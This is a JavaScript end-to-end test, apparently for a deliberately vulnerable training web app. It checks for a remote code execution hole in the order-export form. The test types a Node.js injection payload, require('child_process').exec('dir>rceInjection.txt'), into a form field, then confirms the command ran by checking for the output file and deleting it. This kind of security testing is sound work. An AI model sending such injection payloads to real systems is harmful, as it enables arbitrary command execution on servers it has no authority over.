'use strict';
const fs = require('fs');
const path = require('path');
const HelperFunctions = require('./helperFunctions.js');

describe('RCE - RCE Injection', function () {

    beforeEach(function () {
        HelperFunctions.login(browser, 'customer0', 'compass0');
    });

    afterEach(function () {
        HelperFunctions.logout(browser);
    });

    describe('Try to list the file structure', function () {

        beforeEach(function() {
            browser.get('http://localhost:3000');
        });

        it('should be successfully', function () {
            let fileName = 'rceInjection.txt';

            element.all(by.css('.glyphicon.glyphicon-user')).get(0).click();
            browser.sleep(250);
            //Link
            element(by.linkText('My Orders')).click();
            browser.sleep(250);
            //Fill form
            element(by.model('orders.export.from')).sendKeys("1");
            element(by.model('orders.export.range')).sendKeys("require('child_process').exec('dir>" + fileName + "')");
            element(by.buttonText('Export pdf')).click();

            let filePath = '../../' + fileName;

            let exists = false;

            setTimeout(function() {
                try {
                    fs.accessSync(path.join(__dirname, filePath), fs.constants.R_OK | fs.constants.W_OK);
                    exists = true;
                } catch (err) {
                    exists = false
                } finally {
                    expect(exists).toBe(true);
                }

                let unlinkWorked = false;

                try {
                    fs.unlinkSync(path.join(__dirname, filePath));
                    unlinkWorked = true;
                } catch (err) {
                    unlinkWorked = false;
                } finally {
                    expect(unlinkWorked).toBe(true);
                }
            }, 2000);
        });
    });
});
